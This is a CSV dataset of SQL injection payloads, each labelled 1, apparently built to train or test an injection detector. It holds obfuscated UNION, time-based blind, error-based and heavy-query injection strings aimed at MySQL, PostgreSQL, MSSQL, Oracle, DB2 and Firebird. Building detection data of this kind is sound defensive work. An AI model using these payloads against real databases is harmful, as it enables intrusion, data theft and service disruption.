Query,Label
"se%%l%%e%%c%t * %f%%ro%%m generate_series  (  3551,3551,case when   (  3551  =  6451  )   then 1 else 0 end  )   %%l%%i%mi%%t 1--",1
"call regexp_substr%i%ng  (  repeat  (  right  (  char  (  2385  )  ,0  )  ,500000000  )  ,n%u%ll  )  --",1
-4313%'  )   %o%r 6872  =  6872 %a%%n%d   (  '%'  =  ',1
1'   )    )     )   %%a%%nd 6969  =    (  %s%e%%l%e%%c%%t 6969 f%r%om pg_sleep  (  5   )    )    %%a%%nd    (    (     (  'eihl'  =  'eihl,1
sel%e%%c%%t   (  case when   (  3140  =  4625  )   then 1 else 3140*  (  sel%e%%c%%t 3140 %%f%ro%m master..sysda%ta%%ba%%s%%es  )   end  )  --,1
"-9861' union all s%e%lect 5710,5710,5710,5710,5710--",1
"1 %w%%h%er%e 8273  =  8273 union all %%s%%e%l%e%%c%%t %%n%u%l%l,%%n%u%l%l,%%n%u%l%l,%%n%u%l%l,%%n%u%l%l,%%n%u%l%l,%%n%u%l%l,%%n%u%l%l#",1
"1%'   )    )     )   procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",1
"1""   )    )    as swix %wh%er%e 2459  =  2459 %o%r 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --",1
"1   )    )     )   %a%nd   (  s%%elec%%t 9067 %%fr%om  (  s%%elec%%t count  (  *  )  ,concat  (  0x7171706a71,  (  s%%elec%%t   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,flo%or  (  r%a%nd  (  0  )  *2   )    )   x %%fr%om %inf%ormation_schema.character_s%%e%%ts group %by x  )  a  )   %a%nd    (    (     (  8382  =  8382",1
1  )   as selm %%wh%%ere 5759  =  5759,1
"-6112""  )   union all %%s%e%%le%ct 8203,8203,8203,8203,8203,8203,8203--",1
-8369  )   wh%er%e 7234  =  7234 %o%%r%d%er %b%%y 1--,1
"1' %or elt  (  6272  =  6272,sleep  (  5   )    )   ",1
"1""   )    )     )   union all %%s%%e%%l%%e%%ct %n%%ul%l,%n%%ul%l#",1
"1   )    )     )   a%%n%%d char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substri%ng  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,%%n%ul%l  )  ,0  )  ,500000000  )  ,%%n%ul%l  )   a%%n%%d    (    (     (  2997  =  2997",1
"%%s%%el%%e%%ct benchmark  (  5000000,md5  (  0x4c4d6142   )    )    %a%nd   (  ""%""  =  """,1
1'||  (  %%s%e%%le%%c%%t 'zqwd' w%h%er%e 1647  =  1647 rlik%e sleep  (  5   )    )   ||',1
"1""   )    )     )    (  %%sel%%e%c%%t   (  case when   (  4587  =  4587  )   then regexp_substr%%i%%ng  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,%nul%%l  )  ,0  )  ,500000000  )  ,%nul%%l  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   %f%r%%o%m   (  v%%alue%%s  (  0   )    )     )   an%d    (    (     (  ""fcpm""  =  ""fcpm",1
1 w%%h%er%%e 2239  =  2239 %%and 6969  =    (  %%se%%le%ct 6969 %f%r%o%m pg_sleep  (  5   )    )   --,1
1'||  (  s%%e%%l%%e%c%%t 'xemx' %fr%%o%m dual %wh%%e%%r%e 4683  =  4683 or sleep  (  5  )  #,1
se%lec%%t   (  case when   (  4291  =  6937  )   then 4291 else 4291*  (  se%lec%%t 4291 %f%r%%o%%m mysql.db  )   end  )  #,1
"1""  )   %wh%e%re 8462  =  8462 %%a%%n%%d %%upd%at%exml  (  3393,concat  (  0x2e,0x7171706a71,  (  %%se%%l%%ect   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  --",1
"-1055' union all %%sel%%ec%t 7758,7758,7758,7758,7758,7758--",1
"-2630'   )    )    as xavw %wh%e%r%%e 6291  =  6291 union all s%e%l%e%ct 6291,6291,6291,6291,6291,6291,6291,6291,6291#",1
"1' w%%h%%e%re 8451  =  8451 union all %s%%e%lec%t n%u%ll,n%u%ll,n%u%ll,n%u%ll,n%u%ll,n%u%ll,n%u%ll,n%u%ll,n%u%ll#",1
1' wh%%er%e 8635  =  8635 %%o%%r%%d%%er b%%y 1--,1
-8447 %wh%e%r%e 2850  =  2850 %o%r 7147  =  3262,1
"1 %and elt  (  4249  =  4249,7259  )  ",1
"1%'   )    )    o%r 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",1
"1"" %%w%%h%%e%%r%e 6179  =  6179",1
1'  )   %%w%h%%e%%r%%e 6842  =  6842,1
"1'   )    )    as qzyp w%h%%e%%r%e 5081  =  5081 o%r 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  --",1
-3937   )    )    o%r 3038  =  3038,1
"1%' o%r 8315  =    (  se%l%ec%t count  (  *  )   %fr%o%%m sysibm.sys%%t%%a%b%les as t1,sysibm.sys%%t%%a%b%les as t2,sysibm.sys%%t%%a%b%les as t3  )   a%%nd '%'  =  '",1
1'+  (  %s%e%%le%ct 'diet' %w%h%e%r%%e 7004  =  7004 r%%l%%ik%%e sleep  (  5   )    )   +',1
1'  )   as cdrm %%wh%%er%e 4595  =  4595 %%order b%%y 1#,1
"1""   )    )    as zbfj %w%%h%e%%r%e 2285  =  2285",1
"1'  )   wh%e%%r%%e 4407  =  4407 a%%n%%d char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,%%null  )  ,0  )  ,500000000  )  ,%%null  )  --",1
1 an%d 4595  =  4595#,1
-9429'  )   %%o%rder %%by 1--,1
1%'   )    )    r%l%i%%ke   (  s%%e%%le%%c%t   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    %%a%%nd    (    (   '%'  =  ',1
"1""   )    )    a%%n%d 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    a%%n%d    (    (   ""alkz""  =  ""alkz",1
s%%el%%e%c%t   (  case when   (  5152  =  7853  )   then 5152 else 5152*  (  s%%el%%e%c%t 5152 %f%%r%o%m mysql.db  )   end  )  #,1
"1%"" union all %%se%le%c%%t %%n%ul%l,%%n%ul%l,%%n%ul%l,%%n%ul%l,%%n%ul%l,%%n%ul%l#",1
"1 or 5356  =    (  %s%%e%%l%e%%c%%t count  (  *  )   %f%r%%o%m sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
"1'   )    )     )   %a%%nd 8514  =    (  se%%l%%ec%%t count  (  *  )   %f%r%%o%%m doma%%in.doma%%ins as t1,doma%%in.columns as t2,doma%%in.t%%ab%l%%es as t3  )   %a%%nd    (    (     (  'peyy'  =  'peyy",1
"1  )   %a%%n%d elt  (  3114  =  3114,sleep  (  5   )    )   #",1
"1  )   as zmjm w%h%e%re 9125  =  9125 %o%r char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substr%%ing  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,n%ul%l  )  --",1
"-7802'   )    )     )   o%%r elt  (  8778  =  9974,9974  )   %a%%n%%d    (    (     (  'glsq' l%i%k%e 'glsq",1
1 %o%r sleep  (  5  )  #,1
"1"" a%%n%%d elt  (  1210  =  1210,sleep  (  5   )    )    a%%n%%d ""zhxm""  =  ""zhxm",1
"1   )    )    as myyh %w%%h%e%r%%e 5116  =  5116 %or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",1
"1',  (  %selec%t   (  case when   (  4209  =  5879  )   then 1 else 4209*  (  %selec%t 4209 f%%r%%o%%m i%%nf%%o%rmation_schema.character_%se%ts  )   end   )    )   ",1
1'  )   rl%i%k%e   (  s%%e%%l%%e%c%t   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    an%d   (  'gzpx'  =  'gzpx,1
"1'  )   %or   (  %%s%elect 2*  (  if   (    (   %%s%elect * %%f%rom   (  %%s%elect concat  (  0x7171706a71,  (  %%s%elect   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   %a%n%%d   (  'bzgs' %%li%k%e 'bzgs",1
"-2314""   )    )    or make_%%se%t  (  9354  =  9354,7185  )   an%%d    (    (   ""uatq"" like ""uatq",1
"%%s%%e%%l%%e%%c%t benchmark  (  5000000,md5  (  0x4c4d6142   )    )    %%and   (  'dvpw'  =  'dvpw",1
"1'   )    )    as nxhp %w%%he%%re 2649  =  2649 %o%r 9643  =    (  %%se%%l%ec%t count  (  *  )   %f%%ro%m domai%n.domai%ns as t1,domai%n.columns as t2,domai%n.%%t%ab%l%%es as t3  )  --",1
"-2287'   )    )    union all %se%l%ec%t 1200,1200,1200,1200,1200#",1
"-6184""   )    )    %%or 2724 %%i%n    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  %%s%e%l%e%%c%t   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   %%an%%d    (    (   ""rovr""  =  ""rovr",1
%%se%l%ec%t   (  case when   (  6002  =  9048  )   then 6002 else 6002*  (  %%se%l%ec%t 6002 fro%m mysql.db  )   end  )  #,1
1'||  (  %%s%%e%l%ec%t 'ywfo' f%rom dual %wh%%e%r%%e 4168  =  4168 rl%%i%ke sleep  (  5  )  #,1
"1"" o%%r 6793  =    (  %s%e%%l%e%ct 6793 %f%ro%m pg_sleep  (  5   )    )    %%a%nd ""pwwb"" %l%%i%%k%%e ""pwwb",1
"1%'   )    )     )    (  s%%e%le%%ct   (  case when   (  4587  =  4587  )   then regexp_substr%i%ng  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,%nu%%l%%l  )  ,0  )  ,500000000  )  ,%nu%%l%%l  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   %%f%%ro%m   (  v%%a%l%%ue%%s  (  0   )    )     )   %%a%n%d    (    (     (  '%'  =  '",1
"1""   )    )    %%a%%n%%d   (  s%%e%l%ec%%t 2*  (  if   (    (   s%%e%l%ec%%t * %f%r%%o%m   (  s%%e%l%ec%%t concat  (  0x7171706a71,  (  s%%e%l%ec%%t   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   %%a%%n%%d    (    (   ""llgb"" %l%ike ""llgb",1
"-5202 union all %s%%ele%%ct 5332,5332,5332,5332,5332,5332,5332#",1
"1""  )   %a%%n%%d 6969  =    (  s%e%%l%e%c%t 6969 f%r%o%%m pg_sleep  (  5   )    )    %a%%n%%d   (  ""btht""  =  ""btht",1
"-6307' %%whe%%re 8916  =  8916 union all %%s%e%%l%e%%c%%t 8916,8916,8916,8916,8916,8916,8916--",1
"1' %i%%n boolean mode  )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  %%s%e%%l%e%%c%%t   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   #",1
1   )    )    union all %%s%%ele%%c%t %n%u%l%%l#,1
"-4955%' union all %%se%%le%c%t 5928,5928--",1
"1' %%a%%n%d elt  (  2266  =  7467,7467  )  ",1
1' %%an%d   (  se%l%e%c%%t * f%r%%o%m   (  se%l%e%c%%t  (  sleep  (  5   )    )     )  fzno  )   %%an%d 'mepp'  =  'mepp,1
"1,  (  %%s%el%ec%%t   (  case when   (  3717  =  3717  )   then 1 else 3717*  (  %%s%el%ec%%t 3717 %f%%r%%o%%m master..sys%d%%a%%t%a%%b%as%%es  )   end   )    )   ",1
"1'  )   or elt  (  6272  =  6272,sleep  (  5   )    )    %%a%n%d   (  'tmbs'  =  'tmbs",1
-4901  )   %or 3407  =  6442#,1
1' %w%he%r%e 4134  =  4134 a%n%d 1102  =  6300--,1
"1'   )    )     )   a%n%d extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  %%se%l%%ec%t   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    a%n%d    (    (     (  'hllf'  =  'hllf",1
"-1598""   )    )    o%%r elt  (  5329  =  9628,9628  )   %%a%n%d    (    (   ""hyxq"" %l%i%k%%e ""hyxq",1
 (  se%%lec%t * f%r%o%m   (  se%%lec%t  (  sleep  (  5   )    )     )  srmq   )    )   +',1
"1""  )   o%%r   (  %%s%e%l%ec%%t * %%f%%r%o%%m   (  %%s%e%l%ec%%t  (  sleep  (  5   )    )     )  sddo  )  #",1
"-3604'  )   as fyev w%%h%er%e 7259  =  7259 union all se%%le%c%%t 7259,7259,7259,7259--",1
-6433%'   )    )    or 9323  =  9323#,1
-8836%'  )   o%r 4856  =  3891,1
"1 %%an%%d 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",1
"1%'   )    )    o%r 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   a%n%%d    (    (   '%'  =  '",1
 (  7098  =  7098 %and sleep  (  5   )    ) ,1
"1""  )   as jiyl %w%her%e 4893  =  4893 union all %%sel%%e%ct %%n%%u%l%l,%%n%%u%l%l,%%n%%u%l%l,%%n%%u%l%l,%%n%%u%l%l#",1
-3243 o%%r 2266  =  3583#,1
"1'  )   union all %%s%%el%%ect %%n%u%%l%%l,%%n%u%%l%%l,%%n%u%%l%%l,%%n%u%%l%%l,%%n%u%%l%%l--",1
"1%""   )    )     )   %%a%n%%d 3202  =  %%li%%ke  (  'abcdefg',upper  (  hex  (  r%%a%n%%domblob  (  500000000/2   )    )      )    )    %%a%n%%d    (    (     (  ""%""  =  """,1
"1' %a%%n%d extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  %s%e%%le%%c%%t   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    %a%%n%d 'pphf'  =  'pphf",1
"1""   )    )    rl%%i%%k%e   (  %s%e%%l%%e%%c%%t * %f%%r%%o%m   (  %s%e%%l%%e%%c%%t  (  sleep  (  5   )    )     )  sgvo  )   %an%d    (    (   ""bxct"" l%%i%%k%e ""bxct",1
-9120'   )    )    %o%%r 8571  =  8571--,1
1'+  (  %s%%el%%e%%c%%t naiw %%w%%he%re 4924  =  4924,1
-9389'  )   o%%r 8859  =  3989--,1
"-9923%'   )    )     )   union all %s%e%l%ec%%t 8985,8985,8985,8985,8985,8985,8985#",1
1'   )    )    %%a%%nd 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  %%s%%el%%ect   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   %fr%%o%m dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   %%a%%nd    (    (   'hbwk' l%%ike 'hbwk,1
"1""  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  %%sel%e%%c%%t   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and   (  ""tgdu""  =  ""tgdu",1
"-1510'   )    )     )   union all %%s%e%%l%%e%%c%t 8755,8755,8755,8755,8755,8755,8755,8755,8755,8755--",1
"1""  )   union all %%s%%ele%c%t n%%ull,n%%ull,n%%ull,n%%ull,n%%ull,n%%ull,n%%ull#",1
"elt  (  8192  =  8192,sleep  (  5   )    )   ",1
end %%a%nd    (    (   'zeyr'  =  'zeyr,1
"1""   )    )    as luon %%wher%%e 4676  =  4676 r%%l%%i%%k%%e sleep  (  5  )  #",1
"1""  )   %%w%h%%e%%r%%e 6138  =  6138 %an%d 8594  =    (  %%se%%le%%c%%t 8594 %fr%%om pg_sleep  (  5   )    )   --",1
"1"" wh%%e%%re 3740  =  3740 r%l%i%k%%e sleep  (  5  )  #",1
"1'   )    )     )   a%n%d elt  (  4249  =  4249,7259  )   a%n%d    (    (     (  'kgdt' %l%ik%%e 'kgdt",1
1  )   as tngy wh%e%r%e 8956  =  8956 rli%ke   (  se%l%%e%c%%t   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )   --,1
"-4230""   )    )     )   union all %sele%c%%t 6962,6962,6962,6962,6962,6962#",1
-3540 %whe%r%%e 7302  =  7302 o%r 4493  =  utl_%inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  s%e%%l%e%c%%t   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   fro%m dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --,1
"1  )   as lfra %%w%%here 2669  =  2669 %%a%n%%d u%pd%a%t%exml  (  3393,concat  (  0x2e,0x7171706a71,  (  %%s%e%%l%%ec%%t   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  --",1
1'  )   r%%l%ik%e sleep  (  5  )   %%a%%nd   (  'qsub' %%l%ik%e 'qsub,1
"1%""   )    )     )   union all %s%e%l%e%%ct n%%u%l%%l,n%%u%l%%l,n%%u%l%%l,n%%u%l%%l,n%%u%l%%l,n%%u%l%%l,n%%u%l%%l,n%%u%l%%l--",1
"1'+  (  s%e%l%e%%c%%t 'uzaw' %%w%%h%%ere 9900  =  9900 %%o%%r 8315  =    (  s%e%l%e%%c%%t count  (  *  )   fr%o%m sysibm.sys%t%%ab%%les as t1,sysibm.sys%t%%ab%%les as t2,sysibm.sys%t%%ab%%les as t3   )    )   +'",1
"1""  )   as dlfq %w%%h%%e%%r%e 8410  =  8410",1
"1  )   as guru w%h%er%e 7615  =  7615 union all s%elec%t n%u%%l%%l,n%u%%l%%l,n%u%%l%%l,n%u%%l%%l,n%u%%l%%l,n%u%%l%%l,n%u%%l%%l,n%u%%l%%l,n%u%%l%%l,n%u%%l%%l#",1
"1  )   a%%n%d make_%%s%et  (  1559  =  4863,4863  )  ",1
-9484' %%o%%r   (  7129  =  2349  )  *2349 %%a%%n%%d 'fcsa' li%%k%e 'fcsa,1
"1'  )   %%or   (  %%sele%c%t 9173 %f%%rom  (  %%sele%c%t count  (  *  )  ,concat  (  0x7171706a71,  (  %%sele%c%t   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,flo%%or  (  r%%a%nd  (  0  )  *2   )    )   x %f%%rom %%i%nf%%ormation_schema.character_%%s%%e%ts group %%b%y x  )  a  )  ",1
"1"" %wh%%er%%e 5328  =  5328 %%an%d 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",1
"1""   )    )     )   union all s%e%%l%e%%ct %n%u%ll,%n%u%ll,%n%u%ll,%n%u%ll,%n%u%ll,%n%u%ll,%n%u%ll#",1
1'  )   as ihsc w%h%e%re 3978  =  3978,1
"-6125'||  (  %se%%l%%e%%c%t 'hwnm' %wh%%e%%r%%e 1428  =  1428 union all %se%%l%%e%%c%t 1428,1428,1428,1428,1428,1428#",1
s%e%%l%ect   (  case when   (  4660  =  4660  )   then 4660 else cast  (  1 as %i%nt  )  /  (  s%e%%l%ect 0 f%ro%%m dual  )   end  )   f%ro%%m dual--,1
1 r%lik%%e   (  s%e%%l%e%c%t * %%f%r%%o%%m   (  s%e%%l%e%c%t  (  sleep  (  5   )    )     )  sgvo  ) ,1
"1'   )    )    %an%%d row  (  6237,7469  )  >  (  s%elect count  (  *  )  ,concat  (  0x7171706a71,  (  s%elect   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,flo%o%%r  (  r%an%%d  (  0  )  *2   )    )   x fr%%o%%m   (  s%elect 5192 union s%elect 3785 union s%elect 3931 union s%elect 7158  )  a group b%y x  )   %an%%d    (    (   'pbtf'  =  'pbtf",1
"1'  )   %%w%h%%e%r%e 7391  =  7391 %o%r   (  %%s%%el%%e%%c%t 9173 %fr%%o%m  (  %%s%%el%%e%%c%t count  (  *  )  ,concat  (  0x7171706a71,  (  %%s%%el%%e%%c%t   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,flo%o%r  (  rand  (  0  )  *2   )    )   x %fr%%o%m %i%nf%o%rmation_schema.character_s%%ets group b%y x  )  a  )  --",1
1'+  (  %s%%ele%ct dklj w%he%re 3265  =  3265,1
"1'  )   %a%n%d 3202  =  l%i%k%%e  (  'abcdefg',upper  (  hex  (  r%a%n%domblob  (  500000000/2   )    )      )    )   ",1
"1'   )    )    %a%n%d 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  %%se%lec%%t   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   f%r%%om dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   %a%n%d    (    (   'cbwx'  =  'cbwx",1
-3422%'  )   or 5903  =    (  'qqpjq'||  (  s%e%le%%ct case 5903 when 5903 then 1 else 0 end %f%%r%%om rdb$d%%at%%aba%s%e  )  ||'qzvzq'  )   a%nd   (  '%'  =  ',1
s%e%le%c%t pg_sleep  (  5  )   a%%n%%d    (    (     (  9476  =  9476,1
"1 %%o%r row  (  1045,7562  )  >  (  %%se%l%ec%%t count  (  *  )  ,concat  (  0x7171706a71,  (  %%se%l%ec%%t   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,flo%%o%r  (  ra%nd  (  0  )  *2   )    )   x %%fr%%o%%m   (  %%se%l%ec%%t 8488 union %%se%l%ec%%t 5584 union %%se%l%ec%%t 3051 union %%se%l%ec%%t 1210  )  a group %b%%y x  )  -- fwzl",1
-3083  )   o%r 5221  =  7829,1
"1'   )    )    union all se%l%%ect %n%%u%ll,%n%%u%ll,%n%%u%ll--",1
"1""  )   as vcvw %wh%%er%e 2445  =  2445 %%a%%n%%d 8594  =    (  %s%e%lec%t 8594 %fro%m pg_sleep  (  5   )    )   --",1
waitf%o%%r delay '0:0:5' %%a%n%d    (    (     (  'ozjl' %%lik%e 'ozjl,1
"1%' %or %u%p%datexml  (  1808,concat  (  0x2e,0x7171706a71,  (  s%%e%%lec%t   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   a%nd '%'  =  '",1
"1'   )    )    %%and   (  %%sel%e%%c%%t 2*  (  if   (    (   %%sel%e%%c%%t * %%f%r%%o%%m   (  %%sel%e%%c%%t concat  (  0x7171706a71,  (  %%sel%e%%c%%t   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   %%and    (    (   'yzdp'  =  'yzdp",1
"-3411'   )    )     )   union all se%%l%%e%ct 3185,3185,3185,3185,3185,3185,3185,3185--",1
"-6254"" wh%%e%%r%e 8941  =  8941 %o%r elt  (  1032  =  1032,3623  )  --",1
"1' a%nd 3580  =    (  %%s%elec%t count  (  *  )   %f%r%%o%m domai%n.domai%ns as t1,domai%n.columns as t2,domai%n.%t%ab%%l%%es as t3  )  --",1
1   )    )     )   %%o%rde%r %%b%y 1#,1
"-5027%""   )    )    %%o%r 5903  =    (  'qqpjq'||  (  %s%e%%l%e%%ct case 5903 when 5903 then 1 else 0 end f%%r%%o%m rdb$%d%%a%%t%a%%b%a%%s%%e  )  ||'qzvzq'  )   a%%n%%d    (    (   ""%""  =  """,1
s%%ele%%ct   (  case when   (  4006  =  1276  )   then 1 else 4006*  (  s%%ele%%ct 4006 f%r%o%m master..sysd%%a%t%%ab%%a%s%%es  )   end  )  --,1
"1'+  (  %s%e%%lec%t 'tzey' %whe%%r%e 4491  =  4491 union all %s%e%%lec%t %nu%ll,%nu%ll,%nu%ll,%nu%ll,%nu%ll,%nu%ll,%nu%ll,%nu%ll--",1
"s%e%l%ect count  (  *  )   f%r%o%m generate_series  (  1,5000000  )  # fnck",1
1 o%%r%d%e%%r b%%y 1#,1
1   )    )    as xbii w%h%e%re 2262  =  2262 or sleep  (  5  )  --,1
-9340  )   w%her%e 5462  =  5462 o%r 3038  =  3038,1
1'  )   %%o%%r sleep  (  5  )   a%n%%d   (  'fizk'  =  'fizk,1
"-6405  )   as ilah whe%r%%e 5145  =  5145 union all %%sele%c%%t 5145,5145,5145,5145,5145--",1
1   )    )    a%nd   (  4169  =  9887  )  *9887 a%nd    (    (   1137  =  1137,1
"s%%e%l%e%%c%%t count  (  *  )   fr%%om rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 %%a%%n%d 'bnfu' l%i%%k%%e 'bnfu",1
1  )   %%w%%h%%e%re 6472  =  6472,1
"1%""   )    )    a%%nd row  (  6237,7469  )  >  (  sel%%e%%ct count  (  *  )  ,concat  (  0x7171706a71,  (  sel%%e%%ct   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floo%r  (  ra%%nd  (  0  )  *2   )    )   x f%%r%%om   (  sel%%e%%ct 5192 union sel%%e%%ct 3785 union sel%%e%%ct 3931 union sel%%e%%ct 7158  )  a group %b%y x  )   a%%nd    (    (   ""%""  =  """,1
-4595'  )   w%%here 4892  =  4892 o%r%%d%%er by 1--,1
"1   )    )    %%or row  (  1045,7562  )  >  (  %s%%e%l%%e%%ct count  (  *  )  ,concat  (  0x7171706a71,  (  %s%%e%l%%e%%ct   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,flo%%or  (  r%%a%n%%d  (  0  )  *2   )    )   x %fr%o%%m   (  %s%%e%l%%e%%ct 8488 union %s%%e%l%%e%%ct 5584 union %s%%e%l%%e%%ct 3051 union %s%%e%l%%e%%ct 1210  )  a group %b%%y x  )   %%a%n%%d    (    (   8294  =  8294",1
"1'   )    )    %%a%nd make_%%s%%e%%t  (  8403  =  8403,8899  )   %%a%nd    (    (   'sxgl'  =  'sxgl",1
1'   )    )    as xirr wh%%e%%re 2425  =  2425,1
"1'   )    )    union all %%se%%lec%%t %%n%u%l%%l,%%n%u%l%%l,%%n%u%l%%l,%%n%u%l%%l,%%n%u%l%%l,%%n%u%l%%l,%%n%u%l%%l,%%n%u%l%%l--",1
1' r%l%%i%ke   (  se%%l%e%%c%t * f%r%%o%m   (  se%%l%e%%c%t  (  sleep  (  5   )    )     )  vwyq  )  #,1
1'   )    )    as cmll %%wher%e 7948  =  7948 %%an%%d 4386  =  utl_%inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  s%%e%l%%ec%t   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   %f%%rom dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --,1
"1""   )    )    procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  s%e%%lec%t   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   a%n%d    (    (   ""jzbb""  =  ""jzbb",1
